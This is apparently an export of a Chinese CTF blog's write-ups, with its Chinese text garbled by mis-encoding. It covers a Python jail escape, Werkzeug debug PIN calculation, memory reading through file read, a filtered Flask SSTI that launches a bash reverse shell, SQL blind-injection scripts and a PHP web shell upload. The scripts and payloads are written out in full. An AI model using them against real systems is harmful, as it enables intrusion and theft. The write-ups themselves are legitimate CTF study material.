å¯†çš„ç”Ÿäº§æµé‡**\n\né¢˜ç›®æè¿°ï¼š\n\næŸå®‰å…¨éƒ¨é—¨å‘ç°æŸæ¶‰å¯†å·¥å‚ç”Ÿäº§äººå‘˜å·å·é€šè¿‡ç”Ÿäº§ç½‘ç»œä¼ è¾“æ•°æ®ç»™ä¸æ˜äººå‘˜ï¼Œé€šè¿‡æŠ€æœ¯æ‰‹æ®µæˆªè·å‡ºä¸€æ®µé€šè®¯æµé‡ï¼Œä½†æ˜¯å…¶ä¸­çš„å…³é”®ä¿¡æ¯è¢«è¿›è¡Œäº†åŠ å¯†ï¼Œè¯·ä½ æ ¹æ®æµé‡åŒ…çš„å†…å®¹ï¼Œæ‰¾å‡ºè¢«åŠ å¯†çš„ä¿¡æ¯ã€‚\n\nåº”è¯¥ç›´æ¥å»è¿‡æ»¤é€šè®¯æµé‡ æ‰¾åˆ°MODBUSåè®®   è¿½è¸ªæµä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685376104279-3591a49e-3805-4ed5-9e56-bcca3cfbba1f.png)\n\nç»„åˆèµ·æ¥å‘ç°base32ç¼–ç  å› ä¸ºæœ«å°¾æœ‰ç­‰å·å¹¶ä¸”åªæœ‰å¤§å†™å’Œæ•°å­—çš„ç¼–ç \n\n```\nMMYWMX3GNEYWOXZRGAYDA===\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685376171342-f5a06679-c278-4cbd-b93b-a6849e78235b.png)\n\n## pyshell\n\nä¸€é“python jail è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ å¹¶ä¸”é™åˆ¶äº†è¾“å…¥å­—ç¬¦ä¸èƒ½è¶…è¿‡7ä½ å…¶å®å°±æ˜¯æ„é€ shellçš„å¥‡æ·«å§¿åŠ¿\n\npayloadï¼š\n\n```php\n# eval(open(\"/flag\", \"r\").read())\n\"open\"\n_+\"(\"\n_+'\"/'\n_+'f'\n_+'l'\n_+'a'\n_+'g'\n_+'\"'\n_+',\"'\n_+'r\"'\n_+')'\n_+'.r'\n_+'e'\n_+'a'\n_+'d'\n_+\"(\"\n_+\")\"\neval(_)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685421976872-e11473ca-c080-4534-865d-4105b49099fd.png)\n\nè¿™é‡Œç”¨åˆ°çš„`'_'`æ˜¯ä¸€ç§ç‰¹æ®Šæ ‡è¯†ç¬¦ï¼Œ åœ¨äº¤äº’å¼è§£é‡Šå™¨ä¸­è¢«ç”¨æ¥å­˜æ”¾æœ€è¿‘ä¸€æ¬¡æ±‚å€¼ç»“æœ  ã€‚å‚è€ƒï¼š[https://www.bookstack.cn/read/python3.9-reference-zh/spilt.2.spilt.3.ef7aded97a6c46a9.md?wd=%E7%A7%81%E6%9C%89](https://www.bookstack.cn/read/python3.9-reference-zh/spilt.2.spilt.3.ef7aded97a6c46a9.md?wd=ç§æœ‰)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685422038294-70bb1976-24c9-4e7d-95f2-b5e59c7c0437.png)\n\n# ç»“å°¾ï¼š\n\næœ€è¿‘æœŸæœ«äº†ï¼Œå¯èƒ½ä¼šå¿™æœŸæœ«çš„äº‹æƒ…ï¼Œå…ˆæŠŠå…­çº§è¿‡äº†mdï¼Œè¿™æ¬¡ä¸€å®šè¦è¿‡äº†ï¼Œå·²ç»æ˜¯ç¬¬äºŒæ¬¡äº†ï¼Œä¸Šæ¬¡å°±å·®åæ¥åˆ†ï¼Œå¯æ¶å•Šï¼Œä¸æƒ³è¢«è¿™ä¸ªæ‹–ç€äº†ï¼Œè¿˜æœ‰æœŸæœ«å†²äº†ï¼Œä»€ä¹ˆæ•°ç”µï¼Œä¿¡å·ï¼Œç”µè·¯ç»™ğŸ‘´æ­»ï¼Œç­‰ç€å¥¥ï¼Œå¤´å¥—ç»™ä½ è–…ä¸€åœ° å¿…é¡»æ‰“ä½ è„¸å¥¥ï¼Œå½“ç„¶æ¯”èµ›ä¸ä¼šåœï¼Œç§‰ç€èœè¿˜çˆ±æ‰“çš„è‰¯å¥½ä½œé£ï¼Œå†²äº†ï¼Œåªæ˜¯WPä¼šæ¬ ä¸€äº›ï¼Œæ¯”å¦‚BUUè¿˜æ¬ ç€ä¸€äº›ï¼Œäºè´¼ï¼Œå¹²äº†ï¼\n","tags":["RCEå¥‡æ·«æ–¹å¼","è½¯é“¾æ¥"],"categories":["å„èµ›äº‹WP"]},{"title":"NEEPU Sec 2023 å…¬å¼€èµ› WEBéƒ¨åˆ†é¢˜å¤ç°","url":"/post/c9fcd25b.html","content":"\nNEEPU Sec 2023 å…¬å¼€èµ› WEBéƒ¨åˆ†é¢˜å¤ç°\n\næˆ‘å°±æ˜¯ä¸ªçº¯åºŸç‰©\n\n<!--more-->\n\n# Cute Cirno\n\näººæœ€éº»çš„ä¸€é›† æœ¬æ¥åº”è¯¥å¾ˆå¿«å‡ºç»“æœçš„ è¿˜æ˜¯è‡ªå·±å¤ªèœäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846488175-ee0bc923-7cc9-410d-bc70-809ca3c8a30f.png)\n\nå­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´ é€šè¿‡æŠ¥é”™ä¿¡æ¯ å»è¯»appæ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846571811-25873264-780e-4dff-9d59-cd927722f6fc.png)\n\næˆ–è€…è®¿é—®`/proc/self/cmdline`å»è·å–å½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846615322-ce39f4fa-5632-4dfc-8f50-b543633b1ba7.png)\n\nè·å¾—æºç ï¼š\n\n```python\nfrom flask import Flask, request, session, render_template, render_template_string\nimport os, base64\nfrom NeepuFile import neepu_files\n\nCuteCirno = Flask(__name__,static_url_path='/static',static_folder='static')\n\nCuteCirno.config['SECRET_KEY'] = str(base64.b64encode(os.urandom(30)).decode()) + \"*NeepuCTF*\"\n\n@CuteCirno.route('/')\ndef welcome():\n    session['admin'] = 0\n    return render_template('welcome.html')\n\n\n@CuteCirno.route('/Cirno')\ndef show():\n    return render_template('CleverCirno.html')\n\n\n@CuteCirno.route('/r3aDF1le')\ndef file_read():\n    filename = \"static/text/\" + request.args.get('filename', 'comment.txt')\n    start = request.args.get('start', \"0\")\n    end = request.args.get('end', \"0\")\n    return neepu_files(filename, start, end)\n\n\n@CuteCirno.route('/genius')\ndef calculate():\n    if session.get('admin') == 1:\n        print(session.get('admin'))\n        answer = request.args.get('answer')\n        if answer is not None:\n            blacklist = ['_', \"'\", '\"', '.', 'system', 'os', 'eval', 'exec', 'popen', 'subprocess',\n                         'posix', 'builtins', 'namespace','open', 'read', '\\\\', 'self', 'mro', 'base',\n                         'global', 'init', '/','00', 'chr', 'value', 'get', \"url\", 'pop', 'import',\n                         'include','request', '{{', '}}', '\"', 'config','=']\n            for i in blacklist:\n                if i in answer:\n                    answer = \"â‘¨\" +\"\"\"</br><img src=\"static/woshibaka.jpg\" width=\"300\" height=\"300\" alt=\"Cirno\">\"\"\"\n                    break\n            if answer == '':\n                return \"ä½ èƒ½å‘Šè¯‰èªæ˜çš„â‘¨, 1+1çš„answerå—\"\n            return render_template_string(\"1+1={}\".format(answer))\n        else:\n            return render_template('mathclass.html')\n\n    else:\n        session['admin'] = 0\n        return \"ä½ çœŸçš„æ˜¯æˆ‘çš„é©¬æ–¯å¡”å—ï¼Ÿ\"\n\n\nif __name__ == '__main__':\n    CuteCirno.run('0.0.0.0', 5000, debug=True)\n```\n\nå…¶å®ä¸€çœ¼æ‰«è¿‡å»å°±æ˜¯sessionä¼ªé€  ç„¶åå¥—äº†ä¸€å±‚ssti\n\nä½†æ˜¯å½“æ—¶åšè¿™é“é¢˜çš„æ—¶å€™çœ‹äº†ä»–çš„keyç”Ÿæˆè¿‡ç¨‹ å°±è§‰å¾—keyæ ¹æœ¬ä¼ªé€ ä¸äº†\n\n## éé¢„æœŸï¼š\n\nç„¶åæ—¢ç„¶ä¹‹å‰éƒ½æŠ¥é”™äº† è¯´æ˜debugæ˜¯å¼€å¯çš„ æºç ä¸­ä¹Ÿè¡¨æ˜äº†\n\nå‘¢å°±ç›´æ¥å»è®¡ç®—pinç \n\nç½‘ä¸Šè„šæœ¬å¾ˆå¤š ä¸»è¦æœ‰é«˜ç‰ˆæœ¬å’Œä½ç‰ˆæœ¬çš„ è¿™é‡Œè¦æ ¹æ®é¢˜ç›®å»é€‰æ‹©ç›¸åº”çš„è„šæœ¬ç‰ˆæœ¬\n\nè¿™é“é¢˜ç›®æ˜¯é«˜ç‰ˆæœ¬çš„\n\nè„šæœ¬å¦‚ä¸‹ï¼šå‚è€ƒ https://pysnow.cn/archives/170/\n\n```python\nimport hashlib\nfrom itertools import chain\n\nprobably_public_bits = [\n    'root'  # /etc/passwd\n    'flask.app',  # é»˜è®¤å€¼\n    'Flask',  # é»˜è®¤å€¼\n    '/usr/local/lib/python3.8/site-packages/flask/app.py'  # æŠ¥é”™å¾—åˆ°\n]\n\nprivate_bits = [\n    '2485377568585',  # /sys/class/net/eth0/address åè¿›åˆ¶\n    '653dc458-4634-42b1-9a7a-b22a082e1fce898ba65fb61b89725c91a48c418b81bf98bd269b6f97002c3d8f69da8594d2d2'\n    # å­—ç¬¦ä¸²åˆå¹¶ï¼š1./etc/machine-id(dockerä¸ç”¨çœ‹) /proc/sys/kernel/random/boot_idï¼Œæœ‰boot-idé‚£å°±æ‹¼æ¥boot-id 2. /proc/self/cgroup\n]\n\n# ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv = None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                            for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\nå½“æ—¶åšé¢˜æ²¡ç®—å‡ºpinç  ä¸çŸ¥é“æ˜¯å“ªé‡Œå‡ºçš„é—®é¢˜ ç”šè‡³æŠŠæ‰€æœ‰idéƒ½è¯•äº†ä¸€æ¬¡\n\nä¹‹åå¤ç°çš„æ—¶å€™ æ‰å‘ç°è¢«è„šæœ¬ä¸­çš„æç¤ºç¨ç¨è¯¯å¯¼äº†ä¸€ä¸‹ æˆ–è€…æ˜¯è‡ªå·±çº¯èœ\n\n```\n# å­—ç¬¦ä¸²åˆå¹¶ï¼š1./etc/machine-id(dockerä¸ç”¨çœ‹) /proc/sys/kernel/random/boot_idï¼Œæœ‰boot-idé‚£å°±æ‹¼æ¥boot-id 2. /proc/self/cgroup\n```\n\nè„šæœ¬ä¸­æåˆ°`/etc/machine-id(dockerä¸ç”¨çœ‹) ` éš¾é“èµ›é¢˜ç¯å¢ƒä¸æ˜¯dockerå— æˆ‘è£‚å¼€\n\nä½†æ˜¯è¿™é“é¢˜ç›®éœ€è¦åˆå¹¶`/etc/machine-id` `/proc/self/cgroup`æ‰èƒ½è®¡ç®—å‡ºæ­£ç¡®çš„pinç \n\nå½“æ—¶åšé¢˜çš„æ—¶å€™ä¸€ç›´ç”¨`/proc/sys/kernel/random/boot_id`  ` /proc/self/cgroup`å»ç®— ä¸€ç›´æ˜¯é”™çš„\n\nä¸è¿‡è¿™é‡Œä¹Ÿä¸æ˜¯è¯´è„šæœ¬ä¸­æåˆ°çš„æ˜¯é”™çš„ è€Œæ˜¯åšé¢˜çš„æ—¶å€™æœ€å¥½éƒ½è¯•ä¸€é qwq\n\nåº”è¯¥æ˜¯å…ˆå»è¯»`/etc/machine-id`ï¼Œå¦‚æœè¯»ä¸åˆ°,é‚£ä¹ˆå°±æ˜¯`/proc/sys/kernel/random/boot_id`å’Œ`/proc/self/cgroup`æ‹¼æ¥äº†  \n\nè®¡ç®—å‡ºæ¥ä¹‹å å‘½ä»¤æ‰§è¡Œå³å¯\t\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684847479030-dc13e6dc-8671-4aca-800c-ff56cc7245e3.png)\n\n## é¢„æœŸè§£\n\nèµ›åäº†è§£äº†ä¸€ä¸‹ å‘ç°é¢„æœŸè§£å¤ªéš¾äº† æ˜¯æ ¹æ®2022å¹´è“å¸½æ¯åˆèµ›æ”¹ç¼–çš„\n\nç„¶åè¿™é‡Œkeyçš„ç¡®æ˜¯ä¼ªé€ ä¸å‡ºæ¥ ä½†æ˜¯ä»»ä½•ä¿¡æ¯éƒ½æ˜¯å­˜åœ¨å†…å­˜é‡Œ å¯ä»¥é€šè¿‡å»è¯»å†…å­˜è¯»å‡ºæ¥ å€Ÿç”¨pç¥çš„è¯­å¥[https://erroratao.github.io/2022/07/10/File_Session/#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3](https://erroratao.github.io/2022/07/10/File_Session/#è“å¸½æ¯åˆèµ›-file-session-è§è§£)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684847734991-7cd63f83-6f22-46aa-83d3-406c8efd6f6e.png)\n\nè¿™é‡Œç›´æ¥è´´ä¸ŠBoogipop äº®senseiçš„è„šæœ¬ çœ‹å¾—å‡ºæ¥ä¹Ÿæ˜¯ä»pç¥ç¨åŠ ä¿®æ”¹ è€Œæˆ‘è¿è„šæœ¬éƒ½çœ‹ä¸æ‡‚ å°¼ç›å°±èœçš„ç¦»è°± æš‘å‡ä¸€å®šè¦å»ç³»ç»Ÿå­¦ä¸€ä¸‹python å¥½å¥½é”»ç‚¼é”»ç‚¼è‡ªå·±å†™è„šæœ¬çš„èƒ½åŠ›\n\n```python\nimport base64\nimport os\nimport re\nimport requests\n# print(str(base64.b64encode(os.urandom(30)).decode()) + \"*NeepuCTF*\")\n# pollution_url=\"http://localhost:8848/?name=os.path.pardir&m1sery=boogipop\"\n# flagurl=\"http://localhost:8848/../../flag\"\nurl=\"http://neepusec.fun:28954//r3aDF1le\"\nmaps_url = f\"{url}?filename=../../../proc/self/maps\"\nmaps_reg = \"([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0\"\nmaps = re.findall(maps_reg, requests.get(maps_url).text)\nprint(maps)\ncookie=''\nfor m in maps:\n    print(m)\n    start, end = m.split(\"-\")[0], m.split(\"-\")[1]\n    Offset, Length = str(int(start, 16)), str(int(end, 16))\n    read_url = f\"{url}?filename=../../../proc/self/mem&start={Offset}&end={Length}\"\n    print(read_url)\n    s = requests.get(read_url).content\n    print(s)\n    rt = re.findall(b\"(.{40})\\*NeepuCTF\\*\", s)\n    if rt:\n        print(rt[0])\n```\n\nè„šæœ¬å¤§è‡´è¿‡ç¨‹å°±æ˜¯ å…ˆå»è¯»å–/proc/self/mapsçš„ä¿¡æ¯ \n\nç„¶åé€šè¿‡mapé‡Œæ ˆçš„åœ°å€  å†å»å»æ­£åˆ™åŒ¹é…é‡Œé¢çš„ä¿¡æ¯ \n\n```\nmaps_reg = \"([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0\"\n```\n\nå°±æ˜¯å»åŒ¹é…è¿™æ ·çš„ä¿¡æ¯`7f50caee6000-7f50cb9e6000 rw-p 00000000 00:00 0`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684848131309-905d4a14-43af-403a-9294-792623cc66e4.png)\n\nç„¶åå†æ ¹æ®è¯»å‡ºæ¥çš„åœ°å€memå†…å­˜   ç„¶åå†å»é€šè¿‡åœ°å€èŒƒå›´æ­£åˆ™åŒ¹é…æˆ‘ä»¬éœ€è¦çš„key å°±è¡Œäº†\n\nçœŸçš„tql\n\nsessionä¼ªé€ æˆåŠŸå å°±æ˜¯ä¸€ä¸ªè¿‡æ»¤äº† å¾ˆå¤šå­—ç¬¦çš„ssti\n\næ ¹æ®äº®senseiçš„payload session ä¼ªé€ çš„æ—¶å€™ é€šè¿‡æŠŠshellæ”¾è¿›session ç„¶åæˆ‘ä»¬payloadå»æˆªå–å°±å¯ä»¥äº† çœŸçš„tql\n\n```\npython flask_session_cookie_manager3.pyencode-s\"key\"-t\"{'admin':1,'__globals__':1,'os':1,'read':1,'popen':1,'bash-c\\'bash-i>&/dev/tcp/ip/port<&1\\'':1}\"\n```\n\npayloadï¼š`{%print(((lipsum[(session|string)[35:46]])[(session|string)[53:55]])[(session|string)[73:78]]((session|string)[85:139]))%}`\n\nç„¶åè¿™é‡Œéœ€è¦æ³¨æ„ æˆªçš„æ—¶å€™å¹¶ä¸æ˜¯æˆ‘ä»¬ç›´æ¥çœ‹åˆ°çš„`{'admin':1,'__globals__':1,'os':1,'read':1,'popen':1,'bash-c\\'bash-i>&/dev/tcp/ip/port<&1\\'':1}`ç´¢å¼•\n\né€šè¿‡`{%print(session|string)%}`å¯ä»¥æ‰“å°å‡ºæ¥ å‰é¢è¿˜æœ‰ç‚¹å…¶ä»–ä¿¡æ¯ è¿™æ˜¯ä¸€ä¸ªå°ç»†èŠ‚\n\n```\n<SecureCookieSession {'admin': 1, '__globals__': 1, 'os': 1, 'read': 1, 'popen': 1, \"bash -c 'bash -i >& /dev/tcp/ip/port <&1'\": 1}>\n```\n\né€šè¿‡åå¼¹shell å°±okäº† çœŸçš„å¤ªå¼ºäº†\n\nå‘ç°è¿˜æ˜¯å¾—å»è€è€å®å®å»åˆ·ä¸€éctfshowçš„ssti å»å¼„æ˜ç™½ä¸åŒçš„paylaod\n\n\n\n# ezphp\n\nå½“æ—¶åšè¿™é“é¢˜ ä¸€çœ‹ç•Œé¢æ˜¯ç©ºç™½çš„ å„ç§å°è¯•ä¹‹åè¿˜æ˜¯å•¥éƒ½æ²¡æœ‰ å°±æ”¾å¼ƒäº†\n\nçœ‹äº†wp è¿”ç°æ˜¯php<=7.4.21è¿œç¨‹æºç æ³„éœ²çš„æ¼æ´  https://cn-sec.com/archives/1530845.html\t\n\nå…¶å®å…³é”®æ˜¯æ€ä¹ˆå‘ç°phpç‰ˆæœ¬???? å¹¶ä¸”æ£€ç´¢åˆ°ç›¸å…³æ¼æ´\n\nå¯èƒ½å¤§ä½¬ä¸€çœ¼å°±ä¸çœŸäº† å¯¹æˆ‘æ¯”è¾ƒå›°éš¾\n\nç„¶åæŠ“åŒ… æ„é€ ä¸€ä¸ªå¦‚ä¸‹çš„è¯·æ±‚å¤´\n\n```python\nGET / HTTP/1.1\nHost: neepusec.fun:28426\n\n\nGET /HTTP/1.1\n```\n\nè·å¾—æºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684852650636-c4706a7d-d4b2-4246-922e-4109cacd8b54.png)\n\næ˜¯ä¸€ä¸ªpopé“¾\n\n```php\n<?php\n  class  one{\n  public function __call($name,$ary)\n  {\n    if ($this->key === true||$this->finish1->name) {\n      if ($this->finish->finish){\n        call_user_func($this->now[$name],$ary[0]);\n      }\n    }\n  }\n  public function neepuctf(){\n  $this->now=0;\n  return $this->finish->finish;\n}\npublic function __wakeup(){\n  $this->key=True;\n}\n}\nclass two{\n  private $finish;\n  public $name;\n  public function __get($value){\n\n    return $this->$value=$this->name[$value];\n  }\n\n}\n\nclass three{\n  public function __destruct()\n  {\n    if($this->neepu->neepuctf()||!$this->neepu1->neepuctf()){\n      $this->fin->NEEPUCTF($this->rce,$this->rce1);\n    }\n\n  }\n}\nclass four{\n  public function __destruct()\n  {\n    if ($this->neepu->neepuctf()){\n      $this->fin->NEEPUCTF1($this->rce,$this->rce1);\n    }\n\n  }\n  public function __wakeup(){\n    $this->key=false;\n  }\n}\nclass five{\n  public $finish;\n  private $name;\n\n  public function __get($name)\n  {\n    return $this->$name=$this->finish[$name];\n  }\n}\n\n$a=$_POST[\"neepu\"];\nif (isset($a)){\n  unserialize($a);\n}\n```\n\nåšä¸å‡ºæ¥ æ˜¯åœ¨å¤ªèœäº† é‡Œé¢æœ‰æˆ‘ä¸ä¼šçš„çŸ¥è¯†ç‚¹  æ²¡æœ‰å±æ€§å€¼æ˜¯æ€ä¹ˆpopçš„ å¥½ç¦»è°± \n\nä¹–ä¹–å»åˆ·ctfshow\n\nå…ˆæ”¾ç€å§\n\nä¹‹åå†å›æ¥å¡«å‘ æˆ‘æ˜¯åƒåœ¾ å‘œå‘œå‘œ å¤ªèœäº† èœçš„æƒ³æ­»\n","tags":["ssti","PHPååºåˆ—åŒ–","flaskæ¡†æ¶"],"categories":["å„èµ›äº‹WP"]},{"title":"buuctf-84-[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb","url":"/post/1e328461.html","content":"\n[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb\n\n<!--more-->\n\nä¸€ä¸ªç™»å½•ç•Œé¢ æŸ¥çœ‹æºç å‘ç°å›¾ç‰‡æ˜¯é€šè¿‡`/image.php?id=1`è·å–çš„ çŒœæµ‹è¿™é‡Œåº”è¯¥æ˜¯æœ‰sqlæ³¨å…¥çš„\n\næ—¥å¸¸æŸ¥çœ‹`/robots.txt`å‘ç°å­˜åœ¨å¤‡ä»½æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632411207-29709d15-5b2b-4537-8cea-b8cae315b8ec.png)\n\næŸ¥çœ‹`image.php.bak`\n\n```php\n<ï»¿?php\n  include \"config.php\";\n\n$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";\n$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";\n\n$id=addslashes($id);\n$path=addslashes($path);\n\n$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);\n$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);\n\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n$row=mysqli_fetch_array($result,MYSQLI_ASSOC);\n\n$path=\"./\" . $row[\"path\"];\nheader(\"Content-Type: image/jpeg\");\nreadfile($path);\n```\n\nå‘ç°å­˜åœ¨sqlæ³¨å…¥\n\n```\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n```\n\néœ€è¦æ„é€ ç‰¹æ®Šçš„è¯­å¥æ¥æ³¨å…¥\n\n`addslashes($id)` å…ˆæ¥çœ‹çœ‹addslashes()å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632796661-b60d58ce-2bd8-425b-9ee7-aaa233bc2066.png)\n\nå®ƒä¼šåœ¨è¿™äº›ç¬¦å·å‰æ·»åŠ åæ–œæ è¿›è¡Œè½¬ä¹‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632822501-8d3aec4a-35e3-4af4-832e-f1426364e177.png)\n\nå®˜æ–¹æ–‡æ¡£ä¹ŸæåŠäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632852036-00011032-8464-4663-8b00-dd4e173b64b6.png)\n\nå¦‚æœä½¿ç”¨ä¸å¾—å½“ å°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜\n\nå†æ¥çœ‹`$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);`\n\nçœ‹åˆ°`$id`å­˜åœ¨ä¸€ä¸ªæ›¿æ¢æ“ä½œ\n\næˆ‘ä»¬å¯ä»¥æ„é€  `$id=\\\\0`=>ç»è¿‡addslashes()=>`$id=\\\\\\\\0`=>str_replace()=>`$id=\\\\`(ç›¸å½“äºä¸€ä¸ªåæ–œæ )\n\nåˆ™æŸ¥è¯¢è¯­å¥å°±ä¼šå˜ä¸ºï¼š`select * from images where id='\\\\' or path='{$path}'`\n\nidåæ–œæ è½¬ä¹‰äº†`'`ä½¿å¾—`$id='\\\\' or path='`é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨`$path`è¾“å…¥æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥\n\næ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªå¸¸è§„çš„äºŒåˆ†æ³•ç›²æ³¨\n\nè„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nimport requests\nimport time\nurl='http://3f7e38a8-5912-4127-be50-a4870ab3b5ad.node4.buuoj.cn:81/image.php'\nresult=''\nfor i in range(40):\n    low=31\n    high=127\n    mid=(low+high)//2\n    while low<=high:\n        payload={\n        \"id\":\"\\\\0\",\n        \"path\":\" or ascii(substr((select password from users),{},1))>{}#\".format(i,mid)}\n        #çˆ†è¡¨: or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{} #\n        #çˆ†å­—æ®µ: or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),{},1))>{} #\n        #çˆ†æ•°æ®: or ascii(substr((select password from users),{},1))>{} #\n        r = requests.get(url=url,params=payload)\n        if (\"JFIF\" in r.text):\n            low = mid + 1\n            mid=(low+high)//2\n        else:\n            high = mid - 1\n            mid=(low+high)//2\n    result+=chr(high+1)\n    print(result)\n    time.sleep(0.3)\n```\n\néœ€è¦æ³¨æ„è¿™é“é¢˜ç›®ç”¨äºæŸ¥è¯¢çš„whereå•åŒå¼•å·éƒ½è¢«wafäº† éœ€è¦bypass\n\nå¯ä»¥ç”¨16è¿›åˆ¶è¿›è¡Œç»•è¿‡ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633339285-638d2e1f-801c-4188-8087-aab736f8c00a.png)\n\nå¯ä»¥å¾—åˆ°adminå¯†ç ä¸ºï¼š`027e3da10ae66606cef2`\n\nä¹‹åæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼  ç®€å•ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633701281-14648259-464b-4663-8d4c-4641f64ea580.png)\n\nå‘ç°åphpç¼€åéƒ½è¢«è¿‡æ»¤äº† éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶\n\næç¤ºï¼š`I logged the file name you uploaded to logs/upload.4f264cd65c72b60d3bd54f98a8189048.log.php. LOL`\n\nä»–å°†æˆ‘ä»¬çš„æ–‡ä»¶åä¸Šä¼ åˆ°è¿™ä¸ªphpæ–‡ä»¶\n\nå¯ä»¥å‘ç°è¿™ä¸ªphpæ–‡ä»¶è®°å½•äº†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633906495-cb78c8e9-a772-4278-834b-278e0f00268d.png)\n\næ—¢ç„¶è¿™ä¸ªè®°å½•æ–‡ä»¶è‡ªèº«å°±ä¸ºphpæ–‡ä»¶ å¯ä»¥æ‰§è¡Œphpä»£ç  é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ–‡ä»¶åä¸ºä¸€å¥è¯æœ¨é©¬ ä»è€Œgetshell\n\nè¿™é‡Œä»–å±è”½äº† php ç”¨çŸ­æ ‡ç­¾bypasså°±è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684634219540-a5cb5f62-63a9-4446-9ea2-36e3f8e54d98.png)\n\nä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰æ—¶å€™ä¸Šä¼ ä¸Šå»çš„æ–‡ä»¶åğŸä»–ä¸æ˜¾ç¤º ä½†æ˜¯å¯ä»¥è¿è¡Œ å¾ˆå¥‡æ€ªå¯èƒ½æ˜¯ç¯å¢ƒé—®é¢˜\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684634365120-4e0455d5-7cdc-4ba0-b14e-0b92b9a7a146.png)\n","tags":["sqlæ³¨å…¥","sql bypass"],"categories":["buuctf"]},{"title":"buuctf-67-[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢","url":"/post/4f323e41.html","content":"\n[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢\n\n<!--more-->\n\nä¸€é“ç»å…¸çš„ç”¨ifæ¡ä»¶åˆ¤æ–­çš„äºŒåˆ†æ³•ç›²æ³¨é¢˜ç›® è¿‡æ»¤äº†ç©ºæ ¼ ç”¨()åµŒå¥—æˆ–è€…/**/ç»•è¿‡å°±è¡Œäº† å…¶ä»–è¿˜å¥½\n\nå¤ä¹ ä¸€ä¸‹äºŒåˆ†æ³•\n\n```python\nimport requests\nimport time\nurl = 'http://622046c8-08bf-4bd2-8873-9d43830c90c6.node4.buuoj.cn:81/'\nresult=''\nfor i in range(1,25):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        paylaod = {\"stunum\":\"if(ascii(substr((select(value)from(ctf.flag)),{},1))>{},1,0)\".format(i,mid)}\n        #çˆ†åº“ï¼šif(ascii(substr(database(),{},1))>{},1,0)\n        